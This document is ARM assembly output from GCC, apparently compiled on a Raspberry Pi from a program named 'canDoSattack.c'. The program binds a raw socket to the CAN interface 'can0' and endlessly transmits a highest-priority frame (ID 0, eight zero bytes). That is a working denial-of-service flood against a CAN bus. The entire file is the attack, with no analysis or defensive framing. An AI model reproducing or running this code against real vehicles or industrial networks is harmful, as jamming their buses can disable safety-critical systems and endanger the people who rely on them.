	.arch armv6
	.eabi_attribute 27, 3
	.eabi_attribute 28, 1
	.fpu vfp
	.eabi_attribute 20, 1
	.eabi_attribute 21, 1
	.eabi_attribute 23, 3
	.eabi_attribute 24, 1
	.eabi_attribute 25, 1
	.eabi_attribute 26, 2
	.eabi_attribute 30, 6
	.eabi_attribute 18, 4
	.file	"canDoSattack.c"
	.section	.rodata
	.align	2
.LC0:
	.ascii	"socket\000"
	.align	2
.LC1:
	.ascii	"can0\000"
	.align	2
.LC2:
	.ascii	"SIOCGIFINDEX\000"
	.align	2
.LC3:
	.ascii	"bind\000"
	.text
	.align	2
	.global	main
	.type	main, %function
main:
	@ args = 0, pretend = 0, frame = 72
	@ frame_needed = 1, uses_anonymous_args = 0
	stmfd	sp!, {fp, lr}
	add	fp, sp, #4
	sub	sp, sp, #72
	mov	r0, #29
	mov	r1, #3
	mov	r2, #1
	bl	socket
	str	r0, [fp, #-8]
	ldr	r3, [fp, #-8]
	cmp	r3, #0
	bge	.L2
	ldr	r0, .L7
	bl	perror
	mov	r3, #1
	b	.L3
.L2:
	mov	r3, #29
	strh	r3, [fp, #-24]	@ movhi
	ldr	r3, .L7+4
	sub	r2, fp, #76
	mov	r1, r2
	mov	r2, r3
	mov	r3, #5
	mov	r0, r1
	mov	r1, r2
	mov	r2, r3
	bl	memcpy
	sub	r3, fp, #76
	ldr	r0, [fp, #-8]
	ldr	r1, .L7+8
	mov	r2, r3
	bl	ioctl
	mov	r3, r0
	cmp	r3, #0
	bge	.L4
	ldr	r0, .L7+12
	bl	perror
	mov	r3, #1
	b	.L3
.L4:
	ldr	r3, [fp, #-60]
	str	r3, [fp, #-20]
	sub	r3, fp, #24
	ldr	r0, [fp, #-8]
	mov	r1, r3
	mov	r2, #16
	bl	bind
	mov	r3, r0
	cmp	r3, #0
	bge	.L5
	ldr	r0, .L7+16
	bl	perror
	mov	r3, #1
	b	.L3
.L5:
	mov	r3, #0
	str	r3, [fp, #-44]
	mov	r3, #8
	strb	r3, [fp, #-40]
	mov	r3, #0
	strb	r3, [fp, #-36]
	mov	r3, #0
	strb	r3, [fp, #-35]
	mov	r3, #0
	strb	r3, [fp, #-34]
	mov	r3, #0
	strb	r3, [fp, #-33]
	mov	r3, #0
	strb	r3, [fp, #-32]
	mov	r3, #0
	strb	r3, [fp, #-31]
	mov	r3, #0
	strb	r3, [fp, #-30]
	mov	r3, #0
	strb	r3, [fp, #-29]
	sub	r3, fp, #44
.L6:
	ldr	r0, [fp, #-8]
	mov	r1, r3
	mov	r2, #16
	bl	write
	b	.L6
.L3:
	mov	r0, r3
	sub	sp, fp, #4
	ldmfd	sp!, {fp, pc}
.L8:
	.align	2
.L7:
	.word	.LC0
	.word	.LC1
	.word	35123
	.word	.LC2
	.word	.LC3
	.size	main, .-main
	.ident	"GCC: (Debian 4.6.3-14+rpi1) 4.6.3"
	.section	.note.GNU-stack,"",%progbits
